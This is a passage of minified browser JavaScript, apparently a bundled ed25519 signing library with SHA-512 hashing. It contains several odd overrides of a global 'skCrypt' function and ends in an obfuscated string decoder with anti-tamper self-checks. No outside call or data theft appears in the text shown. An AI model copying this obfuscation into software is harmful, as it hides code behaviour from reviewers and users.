          r = Jt(t, e, 1) ^ Jt(t, e, 8) ^ Xt(t, e, 7),
          o = 0 | fe[w - 2],
          i = 0 | he[w - 2],
          s = Zt(o, i, 19) ^ Yt(o, i, 61) ^ Ht(o, 0, 6),
          a = Jt(o, i, 19) ^ Qt(o, i, 61) ^ Xt(o, i, 6),
          u = ne(r, a, he[w - 7], he[w - 16]),
          c = re(u, n, s, fe[w - 7], fe[w - 16]);
        (fe[w] = 0 | c), (he[w] = 0 | u);
      }
      let {
        Ah: n,
        Al: r,
        Bh: o,
        Bl: i,
        Ch: s,
        Cl: a,
        Dh: u,
        Dl: c,
        Eh: l,
        El: d,
        Fh: f,
        Fl: h,
        Gh: p,
        Gl: m,
        Hh: g,
        Hl: y,
      } = this;
      for (let w = 0; w < 80; w++) {
        const t = Zt(l, d, 14) ^ Zt(l, d, 18) ^ Yt(l, d, 41),
          e = Jt(l, d, 14) ^ Jt(l, d, 18) ^ Qt(l, d, 41),
          b = (l & f) ^ (~l & p),
          v = oe(y, e, (d & h) ^ (~d & m), de[w], he[w]),
          A = ie(v, g, t, b, le[w], fe[w]),
          k = 0 | v,
          I = Zt(n, r, 28) ^ Yt(n, r, 34) ^ Yt(n, r, 39),
          S = Jt(n, r, 28) ^ Qt(n, r, 34) ^ Qt(n, r, 39),
          _ = (n & o) ^ (n & s) ^ (o & s),
          T = (r & i) ^ (r & a) ^ (i & a);
        (g = 0 | p),
          (y = 0 | m),
          (p = 0 | f),
          (m = 0 | h),
          (f = 0 | l),
          (h = 0 | d),
          ({ h: l, l: d } = $t(0 | u, 0 | c, 0 | A, 0 | k)),
          (u = 0 | s),
          (c = 0 | a),
          (s = 0 | o),
          (a = 0 | i),
          (o = 0 | n),
          (i = 0 | r);
        const C = te(k, S, T);
        (n = ee(C, A, I, _)), (r = 0 | C);
      }
      ({ h: n, l: r } = $t(0 | this.Ah, 0 | this.Al, 0 | n, 0 | r)),
        ({ h: o, l: i } = $t(0 | this.Bh, 0 | this.Bl, 0 | o, 0 | i)),
        ({ h: s, l: a } = $t(0 | this.Ch, 0 | this.Cl, 0 | s, 0 | a)),
        ({ h: u, l: c } = $t(0 | this.Dh, 0 | this.Dl, 0 | u, 0 | c)),
        ({ h: l, l: d } = $t(0 | this.Eh, 0 | this.El, 0 | l, 0 | d)),
        ({ h: f, l: h } = $t(0 | this.Fh, 0 | this.Fl, 0 | f, 0 | h)),
        ({ h: p, l: m } = $t(0 | this.Gh, 0 | this.Gl, 0 | p, 0 | m)),
        ({ h: g, l: y } = $t(0 | this.Hh, 0 | this.Hl, 0 | g, 0 | y)),
        this.set(n, r, o, i, s, a, u, c, l, d, f, h, p, m, g, y);
    }
    roundClean() {
      yt(fe, he);
    }
    destroy() {
      yt(this.buffer), this.set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    }
  }
  const me = Nt(() => new ue()),
    ge = Nt(() => new pe());
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const ye = BigInt(0),
    we = BigInt(1);
  function be(t, e) {
    if ("boolean" != typeof e)
      throw new Error(t + " boolean expected, got " + e);
  }
  function ve(t) {
    const e = t.toString(16);
    return 1 & e.length ? "0" + e : e;
  }
  function Ae(t) {
    if ("string" != typeof t)
      throw new Error("hex string expected, got " + typeof t);
    return "" === t ? ye : BigInt("0x" + t);
  }
  function ke(t) {
    return Ae(St(t));
  }
  function Ie(t) {
    return pt(t), Ae(St(Uint8Array.from(t).reverse()));
  }
  function Se(t, e) {
    return Rt(t.toString(16).padStart(2 * e, "0"));
  }
  function _e(t, e) {
    return Se(t, e).reverse();
  }
  function Te(t, e, n) {
    let r;
    if ("string" == typeof e)
      try {
        r = Rt(e);
      } catch (i) {
        throw new Error(t + " must be hex string or Uint8Array, cause: " + i);
      }
    else {
      if (!ft(e)) throw new Error(t + " must be hex string or Uint8Array");
      r = Uint8Array.from(e);
    }
    const o = r.length;
    if ("number" == typeof n && o !== n)
      throw new Error(t + " of length " + n + " expected, got " + o);
    return r;
  }
  const Ce = (t) => "bigint" == typeof t && ye <= t;
  function Be(t, e, n, r) {
    if (
      !(function (t, e, n) {
        return Ce(t) && Ce(e) && Ce(n) && e <= t && t < n;
      })(e, n, r)
    )
      throw new Error(
        "expected valid " + t + ": " + n + " <= n < " + r + ", got " + e
      );
  }
  const Ee = (t) => (we << BigInt(t)) - we;
  function xe(t, e, n = {}) {
    if (!t || "object" != typeof t)
      throw new Error("expected valid options object");
    function r(e, n, r) {
      const o = t[e];
      if (r && void 0 === o) return;
      const i = typeof o;
      if (i !== n || null === o)
        throw new Error(`param "${e}" is invalid: expected ${n}, got ${i}`);
    }
    Object.entries(e).forEach(([t, e]) => r(t, e, !1)),
      Object.entries(n).forEach(([t, e]) => r(t, e, !0));
  }
  function Pe(t) {
    const e = new WeakMap();
    return (n, ...r) => {
      const o = e.get(n);
      if (void 0 !== o) return o;
      const i = t(n, ...r);
      return e.set(n, i), i;
    };
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Re = BigInt(0),
    Oe = BigInt(1),
    Me = BigInt(2),
    Le = BigInt(3),
    Ne = BigInt(4),
    De = BigInt(5),
    Ue = BigInt(8);
  function qe(t, e) {
    const n = t % e;
    return n >= Re ? n : e + n;
  }
  function We(t, e, n) {
    let r = t;
    for (; e-- > Re; ) (r *= r), (r %= n);
    return r;
  }
  function ze(t, e) {
    if (t === Re) throw new Error("invert: expected non-zero number");
    if (e <= Re) throw new Error("invert: expected positive modulus, got " + e);
    let n = qe(t, e),
      r = e,
      o = Re,
      i = Oe;
    for (; n !== Re; ) {
      const t = r % n,
        e = o - i * (r / n);
      (r = n), (n = t), (o = i), (i = e);
    }
    if (r !== Oe) throw new Error("invert: does not exist");
    return qe(o, e);
  }
  function Ke(t, e) {
    const n = (t.ORDER + Oe) / Ne,
      r = t.pow(e, n);
    if (!t.eql(t.sqr(r), e)) throw new Error("Cannot find square root");
    return r;
  }
  function Fe(t, e) {
    const n = (t.ORDER - De) / Ue,
      r = t.mul(e, Me),
      o = t.pow(r, n),
      i = t.mul(e, o),
      s = t.mul(t.mul(i, Me), o),
      a = t.mul(i, t.sub(s, t.ONE));
    if (!t.eql(t.sqr(a), e)) throw new Error("Cannot find square root");
    return a;
  }
  function je(t) {
    return t % Ne === Le
      ? Ke
      : t % Ue === De
      ? Fe
      : (function (t) {
          if (t < BigInt(3))
            throw new Error("sqrt is not defined for small field");
          let e = t - Oe,
            n = 0;
          for (; e % Me === Re; ) (e /= Me), n++;
          let r = Me;
          const o = Xe(t);
          for (; 1 === He(o, r); )
            if (r++ > 1e3)
              throw new Error("Cannot find square root: probably non-prime P");
          if (1 === n) return Ke;
          let i = o.pow(r, e);
          const s = (e + Oe) / Me;
          return function (t, r) {
            if (t.is0(r)) return r;
            if (1 !== He(t, r)) throw new Error("Cannot find square root");
            let o = n,
              a = t.mul(t.ONE, i),
              u = t.pow(r, e),
              c = t.pow(r, s);
            for (; !t.eql(u, t.ONE); ) {
              if (t.is0(u)) return t.ZERO;
              let e = 1,
                n = t.sqr(u);
              for (; !t.eql(n, t.ONE); )
                if ((e++, (n = t.sqr(n)), e === o))
                  throw new Error("Cannot find square root");
              const r = Oe << BigInt(o - e - 1),
                i = t.pow(a, r);
              (o = e), (a = t.sqr(i)), (u = t.mul(u, a)), (c = t.mul(c, i));
            }
            return c;
          };
        })(t);
  }
  const Ge = [
    "create",
    "isValid",
    "is0",
    "neg",
    "inv",
    "sqrt",
    "sqr",
    "eql",
    "add",
    "sub",
    "mul",
    "pow",
    "div",
    "addN",
    "subN",
    "mulN",
    "sqrN",
  ];
  function Ve(t, e, n = !1) {
    const r = new Array(e.length).fill(n ? t.ZERO : void 0),
      o = e.reduce(
        (e, n, o) => (t.is0(n) ? e : ((r[o] = e), t.mul(e, n))),
        t.ONE
      ),
      i = t.inv(o);
    return (
      e.reduceRight(
        (e, n, o) => (t.is0(n) ? e : ((r[o] = t.mul(e, r[o])), t.mul(e, n))),
        i
      ),
      r
    );
  }
  function He(t, e) {
    const n = (t.ORDER - Oe) / Me,
      r = t.pow(e, n),
      o = t.eql(r, t.ONE),
      i = t.eql(r, t.ZERO),
      s = t.eql(r, t.neg(t.ONE));
    if (!o && !i && !s) throw new Error("invalid Legendre symbol result");
    return o ? 1 : i ? 0 : -1;
  }
  function Xe(t, e, n = !1, r = {}) {
    if (t <= Re) throw new Error("invalid field: expected ORDER > 0, got " + t);
    let o, i;
    if ("object" == typeof e && null != e) {
      if (r.sqrt || n) throw new Error("cannot specify opts in two arguments");
      const t = e;
      t.BITS && (o = t.BITS),
        t.sqrt && (i = t.sqrt),
        "boolean" == typeof t.isLE && (n = t.isLE);
    } else "number" == typeof e && (o = e), r.sqrt && (i = r.sqrt);
    const { nBitLength: s, nByteLength: a } = (function (t, e) {
      void 0 !== e && ht(e);
      const n = void 0 !== e ? e : t.toString(2).length;
      return { nBitLength: n, nByteLength: Math.ceil(n / 8) };
    })(t, o);
    if (a > 2048)
      throw new Error("invalid field: expected ORDER of <= 2048 bytes");
    let u;
    const c = Object.freeze({
      ORDER: t,
      isLE: n,
      BITS: s,
      BYTES: a,
      MASK: Ee(s),
      ZERO: Re,
      ONE: Oe,
      create: (e) => qe(e, t),
      isValid: (e) => {
        if ("bigint" != typeof e)
          throw new Error(
            "invalid field element: expected bigint, got " + typeof e
          );
        return Re <= e && e < t;
      },
      is0: (t) => t === Re,
      isValidNot0: (t) => !c.is0(t) && c.isValid(t),
      isOdd: (t) => (t & Oe) === Oe,
      neg: (e) => qe(-e, t),
      eql: (t, e) => t === e,
      sqr: (e) => qe(e * e, t),
      add: (e, n) => qe(e + n, t),
      sub: (e, n) => qe(e - n, t),
      mul: (e, n) => qe(e * n, t),
      pow: (t, e) =>
        (function (t, e, n) {
          if (n < Re)
            throw new Error("invalid exponent, negatives unsupported");
          if (n === Re) return t.ONE;
          if (n === Oe) return e;
          let r = t.ONE,
            o = e;
          for (; n > Re; )
            n & Oe && (r = t.mul(r, o)), (o = t.sqr(o)), (n >>= Oe);
          return r;
        })(c, t, e),
      div: (e, n) => qe(e * ze(n, t), t),
      sqrN: (t) => t * t,
      addN: (t, e) => t + e,
      subN: (t, e) => t - e,
      mulN: (t, e) => t * e,
      inv: (e) => ze(e, t),
      sqrt: i || ((e) => (u || (u = je(t)), u(c, e))),
      toBytes: (t) => (n ? _e(t, a) : Se(t, a)),
      fromBytes: (t) => {
        if (t.length !== a)
          throw new Error(
            "Field.fromBytes: expected " + a + " bytes, got " + t.length
          );
        return n ? Ie(t) : ke(t);
      },
      invertBatch: (t) => Ve(c, t),
      cmov: (t, e, n) => (n ? e : t),
    });
    return Object.freeze(c);
  }
  function Ze(t) {
    if ("bigint" != typeof t) throw new Error("field order must be bigint");
    const e = t.toString(2).length;
    return Math.ceil(e / 8);
  }
  function Je(t) {
    const e = Ze(t);
    return e + Math.ceil(e / 2);
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Ye = BigInt(0),
    Qe = BigInt(1);
  function $e(t, e) {
    const n = e.negate();
    return t ? n : e;
  }
  function tn(t, e, n) {
    const r = "pz" === e ? (t) => t.pz : (t) => t.ez,
      o = Ve(t.Fp, n.map(r));
    return n.map((t, e) => t.toAffine(o[e])).map(t.fromAffine);
  }
  function en(t, e) {
    if (!Number.isSafeInteger(t) || t <= 0 || t > e)
      throw new Error(
        "invalid window size, expected [1.." + e + "], got W=" + t
      );
  }
  function nn(t, e) {
    en(t, e);
    const n = 2 ** t;
    return {
      windows: Math.ceil(e / t) + 1,
      windowSize: 2 ** (t - 1),
      mask: Ee(t),
      maxNumber: n,
      shiftBy: BigInt(t),
    };
  }
  function rn(t, e, n) {
    const { windowSize: r, mask: o, maxNumber: i, shiftBy: s } = n;
    let a = Number(t & o),
      u = t >> s;
    a > r && ((a -= i), (u += Qe));
    const c = e * r;
    return {
      nextN: u,
      offset: c + Math.abs(a) - 1,
      isZero: 0 === a,
      isNeg: a < 0,
      isNegF: e % 2 != 0,
      offsetF: c,
    };
  }
  const on = new WeakMap(),
    sn = new WeakMap();
  function an(t) {
    return sn.get(t) || 1;
  }
  function un(t) {
    if (t !== Ye) throw new Error("invalid wNAF");
  }
  function cn(t, e) {
    return {
      constTimeNegate: $e,
      hasPrecomputes: (t) => 1 !== an(t),
      unsafeLadder(e, n, r = t.ZERO) {
        let o = e;
        for (; n > Ye; ) n & Qe && (r = r.add(o)), (o = o.double()), (n >>= Qe);
        return r;
      },
      precomputeWindow(t, n) {
        const { windows: r, windowSize: o } = nn(n, e),
          i = [];
        let s = t,
          a = s;
        for (let e = 0; e < r; e++) {
          (a = s), i.push(a);
          for (let t = 1; t < o; t++) (a = a.add(s)), i.push(a);
          s = a.double();
        }
        return i;
      },
      wNAF(n, r, o) {
        let i = t.ZERO,
          s = t.BASE;
        const a = nn(n, e);
        for (let t = 0; t < a.windows; t++) {
          const {
            nextN: e,
            offset: n,
            isZero: u,
            isNeg: c,
            isNegF: l,
            offsetF: d,
          } = rn(o, t, a);
          (o = e), u ? (s = s.add($e(l, r[d]))) : (i = i.add($e(c, r[n])));
        }
        return un(o), { p: i, f: s };
      },
      wNAFUnsafe(n, r, o, i = t.ZERO) {
        const s = nn(n, e);
        for (let t = 0; t < s.windows && o !== Ye; t++) {
          const { nextN: e, offset: n, isZero: a, isNeg: u } = rn(o, t, s);
          if (((o = e), !a)) {
            const t = r[n];
            i = i.add(u ? t.negate() : t);
          }
        }
        return un(o), i;
      },
      getPrecomputes(t, e, n) {
        let r = on.get(e);
        return (
          r ||
            ((r = this.precomputeWindow(e, t)),
            1 !== t && ("function" == typeof n && (r = n(r)), on.set(e, r))),
          r
        );
      },
      wNAFCached(t, e, n) {
        const r = an(t);
        return this.wNAF(r, this.getPrecomputes(r, t, n), e);
      },
      wNAFCachedUnsafe(t, e, n, r) {
        const o = an(t);
        return 1 === o
          ? this.unsafeLadder(t, e, r)
          : this.wNAFUnsafe(o, this.getPrecomputes(o, t, n), e, r);
      },
      setWindowSize(t, n) {
        en(n, e), sn.set(t, n), on.delete(t);
      },
    };
  }
  function ln(t, e, n, r) {
    !(function (t, e) {
      if (!Array.isArray(t)) throw new Error("array expected");
      t.forEach((t, n) => {
        if (!(t instanceof e)) throw new Error("invalid point at index " + n);
      });
    })(n, t),
      (function (t, e) {
        if (!Array.isArray(t)) throw new Error("array of scalars expected");
        t.forEach((t, n) => {
          if (!e.isValid(t)) throw new Error("invalid scalar at index " + n);
        });
      })(r, e);
    const o = n.length,
      i = r.length;
    if (o !== i)
      throw new Error("arrays of points and scalars must have equal length");
    const s = t.ZERO,
      a = (function (t) {
        let e;
        for (e = 0; t > ye; t >>= we, e += 1);
        return e;
      })(BigInt(o));
    let u = 1;
    a > 12 ? (u = a - 3) : a > 4 ? (u = a - 2) : a > 0 && (u = 2);
    const c = Ee(u),
      l = new Array(Number(c) + 1).fill(s);
    let d = s;
    for (let f = Math.floor((e.BITS - 1) / u) * u; f >= 0; f -= u) {
      l.fill(s);
      for (let e = 0; e < i; e++) {
        const t = r[e],
          o = Number((t >> BigInt(f)) & c);
        l[o] = l[o].add(n[e]);
      }
      let t = s;
      for (let e = l.length - 1, n = s; e > 0; e--)
        (n = n.add(l[e])), (t = t.add(n));
      if (((d = d.add(t)), 0 !== f)) for (let e = 0; e < u; e++) d = d.double();
    }
    return d;
  }
  function dn(t, e) {
    if (e) {
      if (e.ORDER !== t)
        throw new Error("Field.ORDER must match order: Fp == p, Fn == n");
      return (
        !(function (t) {
          return (
            xe(
              t,
              Ge.reduce((t, e) => ((t[e] = "function"), t), {
                ORDER: "bigint",
                MASK: "bigint",
                BYTES: "number",
                BITS: "number",
              })
            ),
            t
          );
        })(e),
        e
      );
    }
    return Xe(t);
  }
  function fn(t, e, n = {}) {
    if (!e || "object" != typeof e)
      throw new Error(`expected valid ${t} CURVE object`);
    for (const s of ["p", "n", "h"]) {
      const t = e[s];
      if (!("bigint" == typeof t && t > Ye))
        throw new Error(`CURVE.${s} must be positive bigint`);
    }
    const r = dn(e.p, n.Fp),
      o = dn(e.n, n.Fn),
      i = ["Gx", "Gy", "a", "weierstrass" === t ? "b" : "d"];
    for (const s of i)
      if (!r.isValid(e[s]))
        throw new Error(`CURVE.${s} must be valid field element of CURVE.Fp`);
    return { Fp: r, Fn: o };
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const hn = BigInt(0),
    pn = BigInt(1),
    mn = BigInt(2),
    gn = BigInt(8),
    yn = { zip215: !0 };
  function wn(t, e) {
    xe(
      e,
      { hash: "function" },
      {
        adjustScalarBytes: "function",
        randomBytes: "function",
        domain: "function",
        prehash: "function",
        mapToCurve: "function",
      }
    );
    const { prehash: n, hash: r } = e,
      { BASE: o, Fp: i, Fn: s } = t,
      a = s.ORDER,
      u = e.randomBytes || Dt,
      c = e.adjustScalarBytes || ((t) => t),
      l =
        e.domain ||
        ((t, e, n) => {
          if ((be("phflag", n), e.length || n))
            throw new Error("Contexts/pre-hash are not supported");
          return t;
        });
    function d(t) {
      return s.create(t);
    }
    function f(t) {
      return d(Ie(t));
    }
    function h(t) {
      const {
          head: e,
          prefix: n,
          scalar: s,
        } = (function (t) {
          const e = i.BYTES;
          t = Te("private key", t, e);
          const n = Te("hashed private key", r(t), 2 * e),
            o = c(n.slice(0, e));
          return { head: o, prefix: n.slice(e, 2 * e), scalar: f(o) };
        })(t),
        a = o.multiply(s),
        u = a.toBytes();
      return { head: e, prefix: n, scalar: s, point: a, pointBytes: u };
    }
    function p(t = Uint8Array.of(), ...e) {
      const o = Mt(...e);
      return f(r(l(o, Te("context", t), !!n)));
    }
    const m = yn;
    o.precompute(8);
    return {
      getPublicKey: function (t) {
        return h(t).pointBytes;
      },
      sign: function (t, e, r = {}) {
        (t = Te("message", t)), n && (t = n(t));
        const { prefix: s, scalar: u, pointBytes: c } = h(e),
          l = p(r.context, s, t),
          f = o.multiply(l).toBytes(),
          m = d(l + p(r.context, f, c, t) * u);
        Be("signature.s", m, hn, a);
        const g = i.BYTES;
        return Te("result", Mt(f, _e(m, g)), 2 * g);
      },
      verify: function (e, r, s, a = m) {
        const { context: u, zip215: c } = a,
          l = i.BYTES;
        (e = Te("signature", e, 2 * l)),
          (r = Te("message", r)),
          (s = Te("publicKey", s, l)),
          void 0 !== c && be("zip215", c),
          n && (r = n(r));
        const d = Ie(e.slice(l, 2 * l));
        let f, h, g;
        try {
          (f = t.fromHex(s, c)),
            (h = t.fromHex(e.slice(0, l), c)),
            (g = o.multiplyUnsafe(d));
        } catch (w) {
          return !1;
        }
        if (!c && f.isSmallOrder()) return !1;
        const y = p(u, h.toBytes(), f.toBytes(), r);
        return h.add(f.multiplyUnsafe(y)).subtract(g).clearCofactor().is0();
      },
      utils: {
        getExtendedPublicKey: h,
        randomPrivateKey: () => u(i.BYTES),
        precompute: (e = 8, n = t.BASE) => n.precompute(e, !1),
      },
      Point: t,
    };
  }
  function bn(t) {
    const {
        CURVE: e,
        curveOpts: n,
        eddsaOpts: r,
      } = (function (t) {
        const e = {
          a: t.a,
          d: t.d,
          p: t.Fp.ORDER,
          n: t.n,
          h: t.h,
          Gx: t.Gx,
          Gy: t.Gy,
        };
        return {
          CURVE: e,
          curveOpts: {
            Fp: t.Fp,
            Fn: Xe(e.n, t.nBitLength, !0),
            uvRatio: t.uvRatio,
          },
          eddsaOpts: {
            hash: t.hash,
            randomBytes: t.randomBytes,
            adjustScalarBytes: t.adjustScalarBytes,
            domain: t.domain,
            prehash: t.prehash,
            mapToCurve: t.mapToCurve,
          },
        };
      })(t),
      o = (function (t, e = {}) {
        const { Fp: n, Fn: r } = fn("edwards", t, e),
          { h: o, n: i } = t;
        xe(e, {}, { uvRatio: "function" });
        const s = mn << (BigInt(8 * r.BYTES) - pn),
          a = (t) => n.create(t),
          u =
            e.uvRatio ||
            ((t, e) => {
              try {
                return { isValid: !0, value: n.sqrt(n.div(t, e)) };
              } catch (r) {
                return { isValid: !1, value: hn };
              }
            });
        if (
          !(function (t, e, n, r) {
            const o = t.sqr(n),
              i = t.sqr(r),
              s = t.add(t.mul(e.a, o), i),
              a = t.add(t.ONE, t.mul(e.d, t.mul(o, i)));
            return t.eql(s, a);
          })(n, t, t.Gx, t.Gy)
        )
          throw new Error("bad curve params: generator point");
        function c(t, e, n = !1) {
          return Be("coordinate " + t, e, n ? pn : hn, s), e;
        }
        function l(t) {
          if (!(t instanceof h)) throw new Error("ExtendedPoint expected");
        }
        const d = Pe((t, e) => {
            const { ex: r, ey: o, ez: i } = t,
              s = t.is0();
            null == e && (e = s ? gn : n.inv(i));
            const u = a(r * e),
              c = a(o * e),
              l = a(i * e);
            if (s) return { x: hn, y: pn };
            if (l !== pn) throw new Error("invZ was invalid");
            return { x: u, y: c };
          }),
          f = Pe((e) => {
            const { a: n, d: r } = t;
            if (e.is0()) throw new Error("bad point: ZERO");
            const { ex: o, ey: i, ez: s, et: u } = e,
              c = a(o * o),
              l = a(i * i),
              d = a(s * s),
              f = a(d * d),
              h = a(c * n);
            if (a(d * a(h + l)) !== a(f + a(r * a(c * l))))
              throw new Error("bad point: equation left != right (1)");
            if (a(o * i) !== a(s * u))
              throw new Error("bad point: equation left != right (2)");
            return !0;
          });
        class h {
          constructor(t, e, n, r) {
            (this.ex = c("x", t)),
              (this.ey = c("y", e)),
              (this.ez = c("z", n, !0)),
              (this.et = c("t", r)),
              Object.freeze(this);
          }
          get x() {
            return this.toAffine().x;
          }
          get y() {
            return this.toAffine().y;
          }
          static fromAffine(t) {
            if (t instanceof h) throw new Error("extended point not allowed");
            const { x: e, y: n } = t || {};
            return c("x", e), c("y", n), new h(e, n, pn, a(e * n));
          }
          static normalizeZ(t) {
            return tn(h, "ez", t);
          }
          static msm(t, e) {
            return ln(h, r, t, e);
          }
          _setWindowSize(t) {
            this.precompute(t);
          }
          precompute(t = 8, e = !0) {
            return p.setWindowSize(this, t), e || this.multiply(mn), this;
          }
          assertValidity() {
            f(this);
          }
          equals(t) {
            l(t);
            const { ex: e, ey: n, ez: r } = this,
              { ex: o, ey: i, ez: s } = t,
              u = a(e * s),
              c = a(o * r),
              d = a(n * s),
              f = a(i * r);
            return u === c && d === f;
          }
          is0() {
            return this.equals(h.ZERO);
          }
          negate() {
            return new h(a(-this.ex), this.ey, this.ez, a(-this.et));
          }
          double() {
            const { a: e } = t,
              { ex: n, ey: r, ez: o } = this,
              i = a(n * n),
              s = a(r * r),
              u = a(mn * a(o * o)),
              c = a(e * i),
              l = n + r,
              d = a(a(l * l) - i - s),
              f = c + s,
              p = f - u,
              m = c - s,
              g = a(d * p),
              y = a(f * m),
              w = a(d * m),
              b = a(p * f);
            return new h(g, y, b, w);
          }
          add(e) {
            l(e);
            const { a: n, d: r } = t,
              { ex: o, ey: i, ez: s, et: u } = this,
              { ex: c, ey: d, ez: f, et: p } = e,
              m = a(o * c),
              g = a(i * d),
              y = a(u * r * p),
              w = a(s * f),
              b = a((o + i) * (c + d) - m - g),
              v = w - y,
              A = w + y,
              k = a(g - n * m),
              I = a(b * v),
              S = a(A * k),
              _ = a(b * k),
              T = a(v * A);
            return new h(I, S, T, _);
          }
          subtract(t) {
            return this.add(t.negate());
          }
          multiply(t) {
            const e = t;
            Be("scalar", e, pn, i);
            const { p: n, f: r } = p.wNAFCached(this, e, h.normalizeZ);
            return h.normalizeZ([n, r])[0];
          }
          multiplyUnsafe(t, e = h.ZERO) {
            const n = t;
            return (
              Be("scalar", n, hn, i),
              n === hn
                ? h.ZERO
                : this.is0() || n === pn
                ? this
                : p.wNAFCachedUnsafe(this, n, h.normalizeZ, e)
            );
          }
          isSmallOrder() {
            return this.multiplyUnsafe(o).is0();
          }
          isTorsionFree() {
            return p.wNAFCachedUnsafe(this, i).is0();
          }
          toAffine(t) {
            return d(this, t);
          }
          clearCofactor() {
            return o === pn ? this : this.multiplyUnsafe(o);
          }
          static fromBytes(t, e = !1) {
            return pt(t), this.fromHex(t, e);
          }
          static fromHex(e, r = !1) {
            const { d: o, a: i } = t,
              c = n.BYTES;
            (e = Te("pointHex", e, c)), be("zip215", r);
            const l = e.slice(),
              d = e[c - 1];
            l[c - 1] = -129 & d;
            const f = Ie(l),
              p = r ? s : n.ORDER;
            Be("pointHex.y", f, hn, p);
            const m = a(f * f),
              g = a(m - pn),
              y = a(o * m - i);
            let { isValid: w, value: b } = u(g, y);
            if (!w) throw new Error("Point.fromHex: invalid y coordinate");
            const v = (b & pn) === pn,
              A = !!(128 & d);
            if (!r && b === hn && A)
              throw new Error("Point.fromHex: x=0 and x_0=1");
            return A !== v && (b = a(-b)), h.fromAffine({ x: b, y: f });
          }
          static fromPrivateScalar(t) {
            return h.BASE.multiply(t);
          }
          toBytes() {
            const { x: t, y: e } = this.toAffine(),
              r = _e(e, n.BYTES);
            return (r[r.length - 1] |= t & pn ? 128 : 0), r;
          }
          toRawBytes() {
            return this.toBytes();
          }
          toHex() {
            return St(this.toBytes());
          }
          toString() {
            return `<Point ${this.is0() ? "ZERO" : this.toHex()}>`;
          }
        }
        (h.BASE = new h(t.Gx, t.Gy, pn, a(t.Gx * t.Gy))),
          (h.ZERO = new h(hn, pn, pn, hn)),
          (h.Fp = n),
          (h.Fn = r);
        const p = cn(h, 8 * r.BYTES);
        return h;
      })(e, n);
    return (function (t, e) {
      return Object.assign({}, e, { ExtendedPoint: e.Point, CURVE: t });
    })(t, wn(o, r));
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    BigInt(0);
  const vn = BigInt(1),
    An = BigInt(2);
  BigInt(3);
  const kn = BigInt(5),
    In = BigInt(8),
    Sn = {
      p: BigInt(
        "0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffed"
      ),
      n: BigInt(
        "0x1000000000000000000000000000000014def9dea2f79cd65812631a5cf5d3ed"
      ),
      h: In,
      a: BigInt(
        "0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffec"
      ),
      d: BigInt(
        "0x52036cee2b6ffe738cc740797779e89800700a4d4141d8ab75eb4dca135978a3"
      ),
      Gx: BigInt(
        "0x216936d3cd6e53fec0a4e231fdd6dc5c692cc7609525a7b2c9562d608f25d51a"
      ),
      Gy: BigInt(
        "0x6666666666666666666666666666666666666666666666666666666666666658"
      ),
    };
  function _n(t) {
    return (t[0] &= 248), (t[31] &= 127), (t[31] |= 64), t;
  }
  const Tn = BigInt(
    "19681161376707505956807079304988542015446066515923890162744021073123829784752"
  );
  function Cn(t, e) {
    const n = Sn.p,
      r = qe(e * e * e, n),
      o = (function (t) {
        const e = BigInt(10),
          n = BigInt(20),
          r = BigInt(40),
          o = BigInt(80),
          i = Sn.p,
          s = (((t * t) % i) * t) % i,
          a = (We(s, An, i) * s) % i,
          u = (We(a, vn, i) * t) % i,
          c = (We(u, kn, i) * u) % i,
          l = (We(c, e, i) * c) % i,
          d = (We(l, n, i) * l) % i,
          f = (We(d, r, i) * d) % i,
          h = (We(f, o, i) * f) % i,
          p = (We(h, o, i) * f) % i,
          m = (We(p, e, i) * c) % i;
        return { pow_p_5_8: (We(m, An, i) * t) % i, b2: s };
      })(t * qe(r * r * e, n)).pow_p_5_8;
    let i = qe(t * r * o, n);
    const s = qe(e * i * i, n),
      a = i,
      u = qe(i * Tn, n),
      c = s === t,
      l = s === qe(-t, n),
      d = s === qe(-t * Tn, n);
    return (
      c && (i = a),
      (l || d) && (i = u),
      (qe(i, n) & Oe) === Oe && (i = qe(-i, n)),
      { isValid: c || l, value: i }
    );
  }
  const Bn = (() => Xe(Sn.p, void 0, !0))(),
    En = (() => ({
      ...Sn,
      Fp: Bn,
      hash: ge,
      adjustScalarBytes: _n,
      uvRatio: Cn,
    }))(),
    xn = (() => bn(En))();
  function Pn(t, e) {
    var n = qn();
    return (
      (Pn = function (e, r) {
        var o = n[(e -= 372)];
        if (void 0 === Pn.UkCzwa) {
          var i = function (t) {
            for (
              var e, n, r = "", o = "", s = r + i, a = 0, u = 0;
              (n = t.charAt(u++));
              ~n && ((e = a % 4 ? 64 * e + n : n), a++ % 4)
                ? (r +=
                    s.charCodeAt(u + 10) - 10 != 0
                      ? String.fromCharCode(255 & (e >> ((-2 * a) & 6)))
                      : a)
                : 0
            )
              n =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  n
                );
            for (var c = 0, l = r.length; c < l; c++)
              o += "%" + ("00" + r.charCodeAt(c).toString(16)).slice(-2);
            return decodeURIComponent(o);
          };
          (Pn.jUxFMP = i), (t = arguments), (Pn.UkCzwa = !![]);
        }
        var s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          var u = function (t) {
            (this.wpEHTZ = t),
              (this.KWoyYP = [1, 0, 0]),
              (this.oquLNP = function () {
                return "newState";
              }),
              (this.pkjOjH = "\\w+ *\\(\\) *{\\w+ *"),
              (this.EPqTlW = "['|\"].+['|\"];? *}");
          };
          (u.prototype.TWuJsl = function () {
            var t = new RegExp(this.pkjOjH + this.EPqTlW).test(
              this.oquLNP.toString()
            )
              ? --this.KWoyYP[1]
              : --this.KWoyYP[0];
            return this.gjLVxc(t);
          }),
            (u.prototype.gjLVxc = function (t) {
              return Boolean(~t) ? this.zfmbGr(this.wpEHTZ) : t;
            }),
            (u.prototype.zfmbGr = function (t) {
              for (var e = 0, n = this.KWoyYP.length; e < n; e++)
                this.KWoyYP.push(Math.round(Math.random())),
                  (n = this.KWoyYP.length);
              return t(this.KWoyYP[0]);
            }),
            new u(Pn).TWuJsl(),
            (o = Pn.jUxFMP(o)),
            (t[s] = o);
        }
        return o;
      }),
      Pn(t, e)
    );
  }
